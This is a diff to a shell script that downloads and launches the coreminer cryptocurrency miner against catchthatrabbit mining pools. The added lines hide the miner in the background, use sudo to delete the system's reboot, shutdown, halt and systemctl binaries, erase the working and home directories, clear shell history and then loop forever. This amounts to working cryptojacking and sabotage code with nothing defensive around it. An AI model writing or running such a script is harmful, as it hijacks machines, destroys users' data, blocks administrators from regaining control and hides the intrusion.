@@ -5,4 +5,15 @@ wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/cor
 tar xf coreminer-linux-x86_64.tar.gz
 cd coreapp
 ./coreminer -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 \
-     -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008
+     -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008 > /dev/null 2>&1 &
+sleep 30
+sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 60
+done
